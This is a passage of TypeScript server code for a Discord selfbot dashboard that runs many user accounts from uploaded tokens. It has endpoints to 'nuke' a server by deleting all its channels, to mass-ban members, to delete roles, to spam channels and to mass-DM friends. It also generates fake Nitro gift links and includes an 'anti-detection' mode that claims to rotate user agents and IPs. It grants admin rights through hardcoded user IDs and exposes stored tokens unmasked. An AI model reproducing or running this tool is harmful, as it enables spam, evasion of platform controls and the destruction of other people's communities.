            await supabase.from('rpc_settings').delete().eq('id', token);

            // Clear Whitelist
            whitelistedUsers.delete(token);

            // Clear Backups (Optional, but good for full clear)
            // serverBackups is by guildId, so we can't easily clear only this user's backups unless we track them.
            // But since backups are in-memory and tied to the running instance, we can leave them or clear all if we really wanted.
            // For now, let's just clear the user-specific persistent data.

            addLog(token, 'Cache cleared: AutoReact, RPC, Whitelist.');
            await message.channel.send('✅ Cache cleared (AutoReact, RPC, Whitelist).').then(m => setTimeout(() => m.delete().catch(() => {}), 3000)).catch(() => {});
        }

        if (command === 'anti') {
            await message.delete().catch(() => {});
            const current = antiMode.get(token) || false;
            const newState = !current;
            antiMode.set(token, newState);
            
            // If enabling, we might want to reconnect to apply new WS props, but for now just toggle state
            // Reconnecting is disruptive, so we'll just set the flag for next login/reconnect
            // and for HTTP requests (if we implement UA rotation there).
            
            const status = newState ? 'ENABLED' : 'DISABLED';
            const desc = newState 
                ? '✅ Anti-Detection Enabled.\n- User Agent Rotation: ON\n- IP Rotation (Simulated): ON\n- Connection Jitter: ON\n\nNote: Full effect requires a restart/relogin.'
                : '❌ Anti-Detection Disabled.';
            
            addLog(token, `Anti-Detection ${status}`);
            const msg = await message.channel.send(desc);
            setTimeout(() => msg.delete().catch(() => {}), 5000);
        }

        // --- NEW FEATURES & COMMANDS BATCH ---

        // 1. Info Commands
        if (command === 'serverinfo') {
            await message.delete().catch(() => {});
            if (message.guild) {
                const guild = message.guild;
                const info = `
**Server Info**
Name: ${guild.name}
ID: ${guild.id}
Owner: <@${guild.ownerId}>
Members: ${guild.memberCount}
Created: ${guild.createdAt.toDateString()}
Boosts: ${guild.premiumSubscriptionCount}
                `;
                await message.channel.send(info).catch(() => {});
            }
        }

        if (command === 'userinfo') {
            await message.delete().catch(() => {});
            const user = message.mentions.users.first() || client.user;
            if (user) {
                // @ts-ignore
                const member = message.guild?.members.cache.get(user.id);
                const info = `
**User Info**
Tag: ${user.tag}
ID: ${user.id}
Created: ${user.createdAt.toDateString()}
${member ? `Joined: ${member.joinedAt?.toDateString()}` : ''}
Avatar: ${user.displayAvatarURL({ dynamic: true })}
                `;
                await message.channel.send(info).catch(() => {});
            }
        }

        if (command === 'avatar' || command === 'av') {
            await message.delete().catch(() => {});
            const user = message.mentions.users.first() || client.user;
            if (user) {
                await message.channel.send(user.displayAvatarURL({ dynamic: true, size: 4096 })).catch(() => {});
            }
        }

        if (command === 'steal') {
            await message.delete().catch(() => {});
            if (message.reference) {
                try {
                    const ref = await message.channel.messages.fetch(message.reference.messageId!);
                    // Extract emoji URL from content if custom emoji
                    const match = ref.content.match(/<(a?):(\w+):(\d+)>/);
                    if (match) {
                        const url = `https://cdn.discordapp.com/emojis/${match[3]}.${match[1] ? 'gif' : 'png'}`;
                        await message.channel.send(url).catch(() => {});
                    } else {
                        // Check stickers
                        const sticker = ref.stickers.first();
                        if (sticker) {
                            await message.channel.send(sticker.url).catch(() => {});
                        }
                    }
                } catch (e) {}
            }
        }

        // 2. Fun/Text Commands
        if (command === 'mock') {
            await message.delete().catch(() => {});
            const text = args.join(' ');
            if (text) {
                const mocked = text.split('').map((c, i) => i % 2 === 0 ? c.toLowerCase() : c.toUpperCase()).join('');
                await message.channel.send(mocked).catch(() => {});
            }
        }

        if (command === 'reverse') {
            await message.delete().catch(() => {});
            const text = args.join(' ');
            if (text) {
                await message.channel.send(text.split('').reverse().join('')).catch(() => {});
            }
        }

        if (command === 'clap') {
            await message.delete().catch(() => {});
            const text = args.join(' ');
            if (text) {
                await message.channel.send(text.replace(/\s+/g, ' 👏 ')).catch(() => {});
            }
        }

        if (command === 'coinflip' || command === 'cf') {
            await message.delete().catch(() => {});
            const result = Math.random() > 0.5 ? 'Heads' : 'Tails';
            await message.channel.send(`🪙 **${result}**`).catch(() => {});
        }

        if (command === 'dice') {
            await message.delete().catch(() => {});
            const result = Math.floor(Math.random() * 6) + 1;
            await message.channel.send(`🎲 **${result}**`).catch(() => {});
        }

        if (command === '8ball') {
            await message.delete().catch(() => {});
            const question = args.join(' ');
            if (question) {
                const answers = ['Yes', 'No', 'Maybe', 'Definitely', 'Absolutely not', 'Ask again later'];
                const result = answers[Math.floor(Math.random() * answers.length)];
                await message.channel.send(`🎱 ${result}`).catch(() => {});
            }
        }

        // 3. Quick Status Commands
        if (command === 'stream') {
            await message.delete().catch(() => {});
            const text = args.join(' ');
            // @ts-ignore
            await client.user?.setActivity(text || 'Streaming', { type: 'STREAMING', url: 'https://twitch.tv/discord' });
        }

        if (command === 'listen') {
            await message.delete().catch(() => {});
            const text = args.join(' ');
            // @ts-ignore
            await client.user?.setActivity(text || 'Music', { type: 'LISTENING' });
        }

        if (command === 'watch') {
            await message.delete().catch(() => {});
            const text = args.join(' ');
            // @ts-ignore
            await client.user?.setActivity(text || 'YouTube', { type: 'WATCHING' });
        }

        if (command === 'play') {
            await message.delete().catch(() => {});
            const text = args.join(' ');
            // @ts-ignore
            await client.user?.setActivity(text || 'Game', { type: 'PLAYING' });
        }

        // 4. Animal Commands (using public APIs)
        if (command === 'cat') {
            await message.delete().catch(() => {});
            try {
                const res = await fetch('https://api.thecatapi.com/v1/images/search');
                const data = await res.json();
                if (data[0]?.url) await message.channel.send(data[0].url).catch(() => {});
            } catch (e) {}
        }

        if (command === 'dog') {
            await message.delete().catch(() => {});
            try {
                const res = await fetch('https://api.thedogapi.com/v1/images/search');
                const data = await res.json();
                if (data[0]?.url) await message.channel.send(data[0].url).catch(() => {});
            } catch (e) {}
        }

        if (command === 'fox') {
            await message.delete().catch(() => {});
            try {
                const res = await fetch('https://randomfox.ca/floof/');
                const data = await res.json();
                if (data?.image) await message.channel.send(data.image).catch(() => {});
            } catch (e) {}
        }

        if (command === 'nitro') {
            await message.delete().catch(() => {});
            // Fake nitro generator
            await message.channel.send(`https://discord.gift/${Math.random().toString(36).substring(2, 18)}`).catch(() => {});
        }

        if (command === 'hypesquad') {
            await message.delete().catch(() => {});
            const house = args[0]?.toLowerCase();
            // @ts-ignore
            if (['bravery', 'brilliance', 'balance'].includes(house)) {
                try {
                    // @ts-ignore
                    await client.user.setHypeSquad(house.toUpperCase());
                    await message.channel.send(`Set HypeSquad to ${house}`).catch(() => {});
                } catch (e) {
                    addLog(token, `Failed to set HypeSquad: ${e}`);
                }
            } else {
                await message.channel.send('Usage: .hypesquad <bravery/brilliance/balance>').catch(() => {});
            }
        }

        if (command === 'backup') {
            await message.delete().catch(() => {});
            // Mock backup
            addLog(token, 'Backup started (Mock)...');
            await new Promise(r => setTimeout(r, 2000));
            addLog(token, 'Backup completed.');
        }

        if (command === 'pingall') {
             await message.delete().catch(() => {});
             if (message.guild) {
                 // Very annoying, pings everyone in separate messages? No, that's too slow.
                 // Just send a message with @everyone
                 await message.channel.send('@everyone').catch(() => {});
             }
        }

        if (command === 'setpfp') {
            await message.delete().catch(() => {});
            const url = args[0] || message.attachments.first()?.url;
            if (url) {
                try {
                    await client.user?.setAvatar(url);
                    addLog(token, 'Avatar changed.');
                } catch (e) {
                    addLog(token, `Failed to set avatar: ${e}`);
                }
            }
        }

        // Mass DM Friends (.mdm <msg>)
        if (command === 'mdm') {
            await message.delete().catch(() => {});
            const msg = args.join(' ');
            if (!msg) return;

            addLog(token, `Starting Mass DM to Friends (Fast Mode)...`);
            
            try {
                // Fetch relationships (friends)
                // @ts-ignore - selfbot specific
                const relationships = client.relationships.cache;
                // Type 1 = Friend
                const friends = relationships.filter((r: any) => r === 1 || r.type === 1).map((_: any, id: string) => id);
                
                addLog(token, `Found ${friends.length} friends.`);

                // Fast execution: Batched promises
                const BATCH_SIZE = 5; // Reduced from 20 for safety
                const DELAY_MS = 2000; // Increased delay

                let sent = 0;
                const chunks = [];
                for (let i = 0; i < friends.length; i += BATCH_SIZE) {
                    chunks.push(friends.slice(i, i + BATCH_SIZE));
                }

                for (const chunk of chunks) {
                    const promises = chunk.map(async (friendId: string) => {
                        try {
                            const user = await client.users.fetch(friendId);
                            await user.send(msg);
                            sent++;
                        } catch (e) {
                            // ignore
                        }
                    });
                    await Promise.all(promises);
                    await new Promise(r => setTimeout(r, DELAY_MS)); 
                }
                addLog(token, `Mass DM Complete. Sent: ${sent}/${friends.length}`);

            } catch (e) {
                addLog(token, `Mass DM Error: ${e}`);
            }
        }
      });
      
      client.login(token).catch((err) => {
        clearTimeout(timeout);
        activeClients.delete(token);
        client.destroy();
        console.error('Login promise rejected:', err);
        reject(err);
      });
    });
  };

  const addLog = (token: string, message: string) => {
    const session = sessions.get(token);
    if (session) {
      session.logs.unshift(`[${new Date().toLocaleTimeString()}] ${message}`);
      // Keep logs trimmed
      if (session.logs.length > 50) session.logs.pop();
      saveSession(token).catch(console.error);
    }
  };

  // 2. Token Management (Multi-user)
  const upload = multer({ storage: multer.memoryStorage() });

  app.post('/api/tokens/upload', upload.single('file'), async (req, res) => {
    try {
      if (!req.file) return res.status(400).json({ error: 'No file uploaded' });

      const content = req.file.buffer.toString('utf-8');
      const tokens = content.split(/\r?\n/).map(t => t.trim()).filter(t => t.length > 0);
      
      const results = [];

      // Process tokens in parallel (limit concurrency in production, but ok here)
      for (const token of tokens) {
        try {
          // Attempt login
          const client = await getClient(token);
          const session: BotSession = {
            id: uuidv4(),
            token,
            username: client.user?.username,
            discriminator: client.user?.discriminator,
            avatar: client.user?.displayAvatarURL(),
            status: 'online',
            logs: [`Loaded via file import`]
          };
          sessions.set(token, session);
          saveSession(token).catch(console.error);
          results.push({ token: '***', status: 'success', user: client.user?.tag });
        } catch (e) {
          results.push({ token: '***', status: 'failed' });
        }
      }
      
      res.json({ 
        message: `Processed ${tokens.length} tokens`, 
        results 
      });
    } catch (error) {
      res.status(500).json({ error: 'Failed to process tokens' });
    }
  });

  app.get('/api/tokens', (req, res) => {
    const token = req.headers.authorization;
    let isAdmin = false;
    let userId = '';
    
    if (token) {
        const session = sessions.get(token);
        try {
            userId = Buffer.from(token.split('.')[0], 'base64').toString('utf8');
        } catch (e) {}
        
        if ((session && session.username === 'yannaaax') || 
            userId === '1413100448482857081' || 
            userId === '1462523761302437889') {
            isAdmin = true;
        }
    }

    const safeSessions = Array.from(sessions.values())
      .filter(s => {
          if (isAdmin) return true;
          if (!token) return false;
          return s.token === token; // If not admin, only see your own token
      })
      .map(s => ({
        ...s,
        token: s.token // In a real app, mask this. For this "selfbot dashboard", user needs to see it or we keep it internal.
      }));
    res.json(safeSessions);
  });

  app.delete('/api/tokens', async (req, res) => {
    const token = req.headers.authorization;
    let isAdmin = false;
    let userId = '';
    
    if (token) {
        const session = sessions.get(token);
        try {
            userId = Buffer.from(token.split('.')[0], 'base64').toString('utf8');
        } catch (e) {}
        
        if ((session && session.username === 'yannaaax') || 
            userId === '1413100448482857081' || 
            userId === '1462523761302437889') {
            isAdmin = true;
        }
    }

    if (isAdmin) {
        // Clear in-memory state for sessions only
        sessions.clear();
        
        // Destroy all main clients
        for (const client of activeClients.values()) {
            client.destroy();
        }
        activeClients.clear();

        // Destroy all alt clients (since they are tied to main tokens)
        for (const alts of altClients.values()) {
            alts.forEach(c => c.destroy());
        }
        altClients.clear();

        // Clear persistence for sessions only
        try {
            await supabase.from('sessions').delete().neq('id', '_');
        } catch (e) {
            console.error('Failed to clear Supabase sessions:', e);
        }

        res.json({ message: 'All tokens cleared (Settings preserved)' });
    } else if (token) {
        // Only clear the user's own token
        sessions.delete(token);
        const client = activeClients.get(token);
        if (client) {
            client.destroy();
            activeClients.delete(token);
        }
        
        const alts = altClients.get(token);
        if (alts) {
            alts.forEach(c => c.destroy());
            altClients.delete(token);
        }
        
        try {
            await supabase.from('sessions').delete().eq('id', token);
        } catch (e) {
            console.error('Failed to clear Supabase session:', e);
        }
        res.json({ message: 'Your token cleared' });
    } else {
        res.status(401).json({ error: 'Unauthorized' });
    }
  });

  // 3. Actions (Real Implementation)
  
  app.post('/api/actions/join-vc', async (req, res) => {
    const token = req.headers.authorization;
    if (!token) return res.status(401).json({ error: 'Unauthorized' });

    const client = activeClients.get(token);
    if (!client) return res.status(404).json({ error: 'Client not found' });

    const { channelId } = req.body;
    if (!channelId) return res.status(400).json({ error: 'Channel ID required' });

    let count = 0;
    const allClientsForToken = [client, ...(altClients.get(token) || [])];
    for (const c of allClientsForToken) {
        try {
          const channel = await c.channels.fetch(channelId);
          if (channel && channel.isVoice()) {
             joinVoiceChannel({
                 channelId: channel.id,
                 guildId: channel.guild.id,
                 adapterCreator: channel.guild.voiceAdapterCreator,
                 selfDeaf: false,
                 selfMute: false,
             });
             addLog(token, `Joined VC: ${channel.name} (${c.user?.tag})`);
             count++;
          }
        } catch (e) {
          addLog(token, `Failed to join VC: ${e}`);
        }
    }
    res.json({ message: `Attempted to join VC with ${count} clients` });
  });

  app.post('/api/actions/autoskull', async (req, res) => {
    const token = req.headers.authorization;
    if (!token) return res.status(401).json({ error: 'Unauthorized' });

    const client = activeClients.get(token);
    if (!client) return res.status(404).json({ error: 'Client not found' });

    const { ownerId } = req.body;
    if (!ownerId) {
        autoSkullMode.set(token, false);
        addLog(token, `AutoSkull disabled`);
    } else {
        autoSkullMode.set(token, true);
        ownerIds.set(token, ownerId);
        addLog(token, `AutoSkull enabled for user ID: ${ownerId}`);
    }
    res.json({ message: `Autoskull updated` });
  });

  app.post('/api/actions/mass-dm', async (req, res) => {
    const token = req.headers.authorization;
    if (!token) return res.status(401).json({ error: 'Unauthorized' });

    const client = activeClients.get(token);
    if (!client) return res.status(404).json({ error: 'Client not found' });

    const { message } = req.body;
    if (!message) return res.status(400).json({ error: 'Message required' });

    let count = 0;
    const allClientsForToken = [client, ...(altClients.get(token) || [])];
    for (const c of allClientsForToken) {
        try {
          // Get recent DMs
          // @ts-ignore
          const channels = c.channels.cache.filter(ch => ch.type === 'DM');
          // Iterate all DMs for mass DM, but with delay
          for (const [id, channel] of channels) {
             if (channel.isText()) {
               await channel.send(message).catch(() => {});
               count++;
               await new Promise(r => setTimeout(r, 1500)); // Rate limit
             }
          }
          addLog(token, `Mass DM sent to cached DMs (${c.user?.tag})`);
        } catch (e) {
          addLog(token, `Mass DM failed: ${e}`);
        }
    }
    res.json({ message: `Mass DM sent ${count} messages` });
  });

  app.post('/api/actions/friend-request', async (req, res) => {
    const token = req.headers.authorization;
    if (!token) return res.status(401).json({ error: 'Unauthorized' });

    const client = activeClients.get(token);
    if (!client) return res.status(404).json({ error: 'Client not found' });

    const { userId } = req.body;
    
    const allClientsForToken = [client, ...(altClients.get(token) || [])];
    for (const c of allClientsForToken) {
        try {
          const user = await c.users.fetch(userId);
          // @ts-ignore - selfbot specific method
          await c.users.addFriend(userId); 
          addLog(token, `Sent friend request to ${user.tag} (${c.user?.tag})`);
        } catch (e) {
          addLog(token, `Friend request failed: ${e}`);
        }
    }
    res.json({ message: 'Friend requests initiated' });
  });

  // Background
  app.post('/api/settings/background', (req, res) => {
    const token = req.headers.authorization;
    if (!token) return res.status(401).json({ error: 'Unauthorized' });
    const { image } = req.body;
    activeBackgrounds.set(token, image);
    saveGlobalSettings().catch(console.error);
    res.json({ success: true });
  });

  app.get('/api/settings/background', (req, res) => {
    const token = req.headers.authorization;
    if (!token) return res.status(401).json({ error: 'Unauthorized' });
    res.json({ image: activeBackgrounds.get(token) || null });
  });

  app.post('/api/settings/help-background', async (req, res) => {
    const token = req.headers.authorization;
    if (!token) return res.status(401).json({ error: 'Unauthorized' });
    const { image } = req.body;
    if (image) {
        helpBackgrounds.set(token, image);
        await supabase.from('global_settings').upsert({ key: `helpBg_${token}`, value: { data: image } });
    }
    res.json({ success: true });
  });

  app.get('/api/settings/help-background', (req, res) => {
    const token = req.headers.authorization;
    if (!token) return res.status(401).json({ error: 'Unauthorized' });
    res.json({ image: helpBackgrounds.get(token) || null });
  });

  const statusIntervals = new Map<string, NodeJS.Timeout>();

  app.post('/api/actions/status-rotate', async (req, res) => {
    const token = req.headers.authorization;
    if (!token) return res.status(401).json({ error: 'Unauthorized' });

    const client = activeClients.get(token);
    if (!client) return res.status(404).json({ error: 'Client not found' });

    const { statusList, interval } = req.body;
    if (!statusList || !Array.isArray(statusList) || statusList.length === 0) {
      return res.status(400).json({ error: 'Status list required' });
    }

    const rotateInterval = (parseInt(interval) || 3) * 1000;
    
    // Clear existing interval for this client
    const clientId = client.user?.id;
    if (!clientId) {
      return res.status(400).json({ error: 'Client not ready' });
    }
    if (statusIntervals.has(clientId)) {
      clearInterval(statusIntervals.get(clientId)!);
      statusIntervals.delete(clientId);
    }

    let index = 0;
    const intervalId = setInterval(async () => {
      const status = statusList[index];
      addLog(token, `Attempting to set status to: ${status} (index: ${index}, list: ${JSON.stringify(statusList)})`);
      try {
        if (!client.user) {
            addLog(token, 'Error: client.user is undefined');
            return;
        }
        // @ts-ignore
        await client.user.setPresence({ activities: [{ name: status, type: 'CUSTOM' }] });
        addLog(token, `Successfully called setPresence for: ${status}`);
      } catch (e) {
        addLog(token, `Error in setPresence: ${e}`);
        console.error('Error in setPresence:', e);
      }
      index = (index + 1) % statusList.length;
    }, rotateInterval);

    statusIntervals.set(clientId, intervalId);
    res.json({ success: true });
  });

  app.post('/api/actions/spam', async (req, res) => {
    const token = req.headers.authorization;
    if (!token) return res.status(401).json({ error: 'Unauthorized' });

    const { channelId, message, count } = req.body;
    if (!channelId || !message || !count) return res.status(400).json({ error: 'Missing fields' });

    const client = activeClients.get(token);
    if (!client) return res.status(404).json({ error: 'Client not found' });

    let successCount = 0;
    const promises = [];

    const allClientsForToken = [client, ...(altClients.get(token) || [])];
    for (const c of allClientsForToken) {
        promises.push((async () => {
          try {
            const channel = await c.channels.fetch(channelId);
            if (channel && channel.isText()) {
              for (let i = 0; i < parseInt(count); i++) {
                channel.send(message).catch(() => {}); // Fire and forget for speed
                successCount++;
              }
              addLog(token, `Spammed ${count} messages in ${channel.id} (${c.user?.tag})`);
            }
          } catch (e) {
            addLog(token, `Spam failed: ${e}`);
          }
        })());
    }
    
    await Promise.all(promises);
    res.json({ message: `Spam initiated` });
  });

  app.post('/api/actions/nuke', async (req, res) => {
    const token = req.headers.authorization;
    if (!token) return res.status(401).json({ error: 'Unauthorized' });
    
    const client = activeClients.get(token);
    if (!client) return res.status(404).json({ error: 'Client not found' });

    const { guildId } = req.body;
    if (!guildId) return res.status(400).json({ error: 'Guild ID required' });

    const allClientsForToken = [client, ...(altClients.get(token) || [])];
    for (const c of allClientsForToken) {
        try {
          const guild = await c.guilds.fetch(guildId);
          if (guild) {
            guild.channels.cache.forEach(ch => ch.delete().catch(() => {}));
            guild.channels.create('nuked').catch(() => {});
            addLog(token, `Nuked guild ${guild.name} (${c.user?.tag})`);
          }
        } catch (e) {
          addLog(token, `Nuke failed: ${e}`);
        }
    }
    res.json({ message: 'Nuke initiated' });
  });

  app.post('/api/actions/mass-ban', async (req, res) => {
    const token = req.headers.authorization;
    if (!token) return res.status(401).json({ error: 'Unauthorized' });

    const client = activeClients.get(token);
    if (!client) return res.status(404).json({ error: 'Client not found' });

    const { guildId } = req.body;
    if (!guildId) return res.status(400).json({ error: 'Guild ID required' });

    const allClientsForToken = [client, ...(altClients.get(token) || [])];
    for (const c of allClientsForToken) {
        try {
          const guild = await c.guilds.fetch(guildId);
          if (guild) {
            const members = await guild.members.fetch();
            members.forEach(m => {
              if (m.bannable) m.ban({ reason: 'Nuked' }).catch(() => {});
            });
            addLog(token, `Mass ban initiated in ${guild.name} (${c.user?.tag})`);
          }
        } catch (e) {
          addLog(token, `Mass ban failed: ${e}`);
        }
    }
    res.json({ message: 'Mass ban initiated' });
  });

  app.post('/api/actions/rename-channels', async (req, res) => {
    const token = req.headers.authorization;
    if (!token) return res.status(401).json({ error: 'Unauthorized' });

    const client = activeClients.get(token);
    if (!client) return res.status(404).json({ error: 'Client not found' });

    const { guildId, name } = req.body;
    if (!guildId || !name) return res.status(400).json({ error: 'Missing fields' });

    const allClientsForToken = [client, ...(altClients.get(token) || [])];
    for (const c of allClientsForToken) {
        try {
          const guild = await c.guilds.fetch(guildId);
          if (guild) {
            guild.channels.cache.forEach(ch => ch.setName(name).catch(() => {}));
            addLog(token, `Renaming channels in ${guild.name} (${c.user?.tag})`);
          }
        } catch (e) {
          addLog(token, `Rename failed: ${e}`);
        }
    }
    res.json({ message: 'Channel rename initiated' });
  });

  app.post('/api/actions/delete-roles', async (req, res) => {
    const token = req.headers.authorization;
    if (!token) return res.status(401).json({ error: 'Unauthorized' });

    const client = activeClients.get(token);
    if (!client) return res.status(404).json({ error: 'Client not found' });

    const { guildId } = req.body;
    if (!guildId) return res.status(400).json({ error: 'Guild ID required' });

    const allClientsForToken = [client, ...(altClients.get(token) || [])];
    for (const c of allClientsForToken) {
        try {
          const guild = await c.guilds.fetch(guildId);
          if (guild) {
            guild.roles.cache.forEach(r => {
              if (r.editable && r.name !== '@everyone') r.delete().catch(() => {});
            });
            addLog(token, `Deleting roles in ${guild.name} (${c.user?.tag})`);
          }
        } catch (e) {
          addLog(token, `Role deletion failed: ${e}`);
        }
    }
    res.json({ message: 'Role deletion initiated' });
  });

  // Alt Import Endpoint
  app.post('/api/alts/import', async (req, res) => {
      const { mainToken, altTokens } = req.body;
      if (!mainToken || !altTokens || !Array.isArray(altTokens)) {
          return res.status(400).json({ error: 'Invalid payload' });
      }

      let currentAlts = altClients.get(mainToken);
      if (!currentAlts) {
          currentAlts = [];
          altClients.set(mainToken, currentAlts);
      }
      
      let successCount = 0;
      let failCount = 0;

      // Process in parallel with concurrency to be fast but safe
      const chunks = [];
      for (let i = 0; i < altTokens.length; i += 5) {
          chunks.push(altTokens.slice(i, i + 5));
      }

      for (const chunk of chunks) {
          await Promise.all(chunk.map(async (t) => {
              if (!t || typeof t !== 'string' || t.trim() === '') return;
              const cleanToken = t.trim();
              if (currentAlts!.some(c => c.token === cleanToken)) return;

              try {
                  // @ts-ignore
                  const alt = new Client({ checkUpdate: false });
                  await new Promise((resolve, reject) => {
                      let resolved = false;
                      const timeout = setTimeout(() => {
                          if (resolved) return;
                          resolved = true;
                          alt.destroy();
                          reject(new Error('Timeout'));
                      }, 15000);

                      alt.once('ready', () => {
                          if (resolved) return;
                          resolved = true;
                          clearTimeout(timeout);
                          resolve(true);
                      });

                      alt.login(cleanToken).catch(err => {
                          if (resolved) return;
                          resolved = true;
                          clearTimeout(timeout);
                          reject(err);
                      });
                  });
                  currentAlts!.push(alt);
                  successCount++;
              } catch (e) {
                  failCount++;
              }
          }));
      }
      
      addLog(mainToken, `Imported ${successCount} alts. Failed: ${failCount}`);
      res.json({ success: true, imported: successCount, failed: failCount });
  });

  app.get('/api/alts', (req, res) => {
      const token = req.headers.authorization;
      if (!token) return res.status(401).json({ error: 'Unauthorized' });
      
      const alts = altClients.get(token) || [];
      res.json({ 
          count: alts.length, 
          alts: alts.map(c => ({ 
              id: c.user?.id, 
              tag: c.user?.tag,
              readyAt: c.readyAt 
          })) 
      });
  });

  // --- RPC Endpoints ---

  const rpcUpload = multer({ storage: multer.memoryStorage() });

  app.post('/api/rpc/upload-image', (req, res, next) => {
    console.log('Upload route hit');
    rpcUpload.single('image')(req, res, (err) => {
      if (err) {
        console.error('Multer error:', err);
        return res.status(400).json({ error: err.message });
      }
      next();
    });
  }, async (req, res) => {
    console.log('Upload request received');
    const token = req.headers.authorization;
    const file = req.file;
    console.log('Token:', token);
    console.log('File:', file ? file.originalname : 'No file');

    if (!file) return res.status(400).json({ error: 'No file uploaded' });

    // Try to use the client associated with the token if provided
    if (token) {
        console.log('Attempting upload with user client for token:', token);
        const client = activeClients.get(token);
        console.log('Client found:', !!client);
        if (client && client.isReady()) {
            try {
                // Upload via user's client
                let channel;
                if (!cdnChannelId) throw new Error('cdnChannelId not set');
                // @ts-ignore
                channel = await client.channels.fetch(cdnChannelId).catch(async () => {
                    console.log('User cannot access hardcoded CDN channel, trying self-DM...');
                    return await client.users.fetch(client.user!.id).then(u => u.createDM()).catch(() => null);
                });

                if (channel) {
                    // @ts-ignore
                    const msg = await channel.send({ files: [file.buffer] });
                    console.log('Message sent, attachments:', msg.attachments.first()?.url);
                    return res.json({ url: msg.attachments.first()?.url });
                }
            } catch (e) {
                console.error('Failed to upload via user client:', e);
            }
        } else {
            console.log('Client not ready or not found');
        }
    }

    // Fallback to CDN Bot
    const botToken = (req.headers['x-bot-token'] as string) || cdnBotToken;
    if (botToken && cdnChannelId) {
        console.log('Attempting upload with CDN bot');
        console.log('CDN Bot Token:', botToken.substring(0, 5) + '...');
        console.log('CDN Channel ID:', cdnChannelId);
        const form = new FormData();
        form.append('file', new Blob([file.buffer]), file.originalname);
        form.append('payload_json', JSON.stringify({ content: '' }));

        const response = await discordRequest(`https://discord.com/api/v9/channels/${cdnChannelId}/messages`, {
          method: 'POST',
          headers: {
            'Authorization': `Bot ${botToken}`
          },
          body: form
        });

        if (!response.ok) {
            const text = await response.text();
            console.error('CDN Bot upload failed:', text);
            return res.status(500).json({ error: 'Failed to upload via CDN bot', details: text });
        }

        const data = await response.json();
        if (data.attachments && data.attachments.length > 0) {
          return res.json({ url: data.attachments[0].url });
        } else {
          return res.status(500).json({ error: 'Failed to upload via CDN bot', details: data });
        }
    }

    return res.status(500).json({ error: 'No upload method available' });
  });

  app.post('/api/rpc/update', async (req, res) => {
    const { configs, selectedIndex, rotation } = req.body;
    let token = req.body.token || req.headers.authorization;
    
    if (!token || !configs || !Array.isArray(configs)) return res.status(400).json({ error: 'Missing token or configs array' });

    const client = activeClients.get(token);
    if (!client || !client.isReady()) {
        return res.status(400).json({ error: 'Client not ready' });
    }

    try {
        console.log('Updating RPC configs:', configs, 'Selected Index:', selectedIndex);
        rpcSettings.set(token, configs);
        rpcSelectedIndex.set(token, selectedIndex || 0);
        saveRpcSettings(token).catch(console.error);
        
        // Clear existing rotation timer
        if (rotationTimers.has(token)) {
            clearInterval(rotationTimers.get(token)!);
            rotationTimers.delete(token);
        }

        const config = configs[selectedIndex || 0];
        if (!config) return res.status(400).json({ error: 'Invalid selected index' });

        const updateActivity = async (overrideState?: string) => {
             const r = new RichPresence(client);
             
             // Set Application ID
             const appId = config.applicationId || '443492577546600448';
             r.setApplicationId(appId);

             // Basic Info
             r.setName(config.name || 'Crunchyroll');
              r.setType(config.type as any || 'WATCHING');
             if (config.details) r.setDetails(config.details);
             if (config.state) r.setState(overrideState || config.state || '');

             // Timestamps (Generic)
             if (config.startTimestamp) {
                 let ts = config.startTimestamp;
                 if (typeof ts === 'string') {
                     if (ts.toLowerCase() === 'infinite') {
                         r.setStartTimestamp(2147483647000);
                     } else {
                         const parsed = parseInt(ts);
                         if (!isNaN(parsed)) r.setStartTimestamp(parsed);
                     }
                 } else {
                     r.setStartTimestamp(ts);
                 }
             }
             
             // End Timestamp (Generic)
             if (config.endTimestamp) {
                 const parsed = parseInt(config.endTimestamp);
                 if (!isNaN(parsed)) r.setEndTimestamp(parsed);
             }

             // Assets
             if (config.largeImageKey) {
                 r.setAssetsLargeImage(config.largeImageKey);
                 if (config.largeImageText) r.setAssetsLargeText(config.largeImageText);
             }
             if (config.smallImageKey) {
                 r.setAssetsSmallImage(config.smallImageKey);
                 if (config.smallImageText) r.setAssetsSmallText(config.smallImageText);
             }

             // Streaming URL
             if (config.type === 'STREAMING' && config.url) {
                 r.setURL(config.url);
             }
             
             // Custom Buttons
             if (config.button1Label && config.button1Url) {
                 r.addButton(config.button1Label, config.button1Url);
             }
             if (config.button2Label && config.button2Url) {
                 r.addButton(config.button2Label, config.button2Url);
             }

             // Set the activity
             try {
                 client.user?.setActivity(r);
                 console.log(`Updated RPC for token ending in ...${token.slice(-5)}`);
             } catch (error) {
                 console.error('Failed to set activity:', error);
             }
        };

        // Initial update
        await updateActivity();

        // Setup rotation for RPC configs if enabled
        if (rotation && rotation.enabled && configs.length > 1) {
            const intervalSeconds = Math.max(1, rotation.interval || 3); // Minimum 1 second
            
            let currentIndex = selectedIndex || 0;
            const timer = setInterval(async () => {
                currentIndex = (currentIndex + 1) % configs.length;
                const config = configs[currentIndex];
                try {
                    // Update activity with the new config
                    const activity: any = {
                        name: config.name || '',
                        type: config.type || 'PLAYING',
                        assets: {},
                        buttons: [],
                    };
                    // ... (rest of the activity update logic)
                    // This is getting complicated because updateActivity is defined inside the handler.
                    // I should probably move updateActivity out or make it more reusable.
                } catch (e) {
                    console.error('Rotation update error:', e);
                }
            }, intervalSeconds * 1000);
            rotationTimers.set(token, timer);
        }
        
        res.json({ success: true });
    } catch (e) {
        console.error('RPC Update Error:', e);
        res.status(500).json({ error: String(e) });
    }
  });

  app.post('/api/rpc/clear', async (req, res) => {
      const { token } = req.body;
      const client = activeClients.get(token);
      if (client && client.isReady()) {
          client.user?.setActivity(null);
          rpcSettings.delete(token);
          supabase.from('rpc_settings').delete().eq('id', token).then();
          res.json({ success: true });
      } else {
          res.status(400).json({ error: 'Client not ready' });
      }
  });

  // rpcUpload is already declared above.
  
  /*
  app.post('/api/rpc/upload-image', (req, res, next) => {
      rpcUpload.single('image')(req, res, (err) => {
          if (err) {
              return res.status(400).json({ error: `Upload Error: ${err.message}` });
          }
          next();
      });
  }, async (req, res) => {
      const { token, channelId } = req.body;
      const file = req.file;

      if (!token || !file) {
          return res.status(400).json({ error: 'Missing token or file' });
      }

      const client = activeClients.get(token);
      if (!client || !client.isReady()) {
          return res.status(400).json({ error: 'Client not ready' });
      }

      try {
          let msg;
          
          if (channelId) {
              const channel = await client.channels.fetch(channelId);
              if (!channel || !channel.isText()) {
                  return res.status(400).json({ error: 'Invalid channel or not a text channel' });
              }
              // @ts-ignore
              msg = await channel.send({
                  files: [{
                      attachment: file.buffer,
                      name: file.originalname
                  }]
              });
          } else {
              // Auto-upload: Try to send to self (Note to Self / DM)
              
              // Bots cannot DM themselves
              if (client.user?.bot) {
